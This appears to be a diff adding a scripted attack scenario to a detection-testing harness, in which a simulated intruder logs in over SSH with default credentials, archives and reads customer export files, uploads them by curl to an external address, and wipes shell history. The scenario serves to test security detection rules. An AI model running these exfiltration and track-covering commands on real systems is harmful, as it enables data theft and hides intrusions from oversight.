@@ -1,0 +1,25 @@
+{
+  "id": "exfil-cleanup",
+  "name": "Exfil and cover tracks",
+  "persona": "human",
+  "seed": 23,
+  "narration": "Hands-on-keyboard post-exploitation: logs in with default creds, archives the fake customer exports, curls them out to an external host, then wipes shell history and logs to cover its tracks. The only scenario that reaches defence evasion (R17) and tool-transfer exfil (R09) — expected High.",
+  "steps": [
+    { "kind": "ssh", "action": "connect" },
+    {
+      "kind": "ssh",
+      "action": "login",
+      "username": "admin",
+      "password": "admin",
+      "expect": "success"
+    },
+    { "kind": "ssh", "action": "command", "cmd": "tar -czf /tmp/loot.tgz /srv/exports" },
+    { "kind": "ssh", "action": "command", "cmd": "cat /srv/exports/customer_data.csv" },
+    { "kind": "ssh", "action": "command", "cmd": "curl -T /tmp/loot.tgz http://198.51.100.9/" },
+    {
+      "kind": "ssh",
+      "action": "command",
+      "cmd": "history -c; rm -f ~/.bash_history; unset HISTFILE"
+    }
+  ]
+}
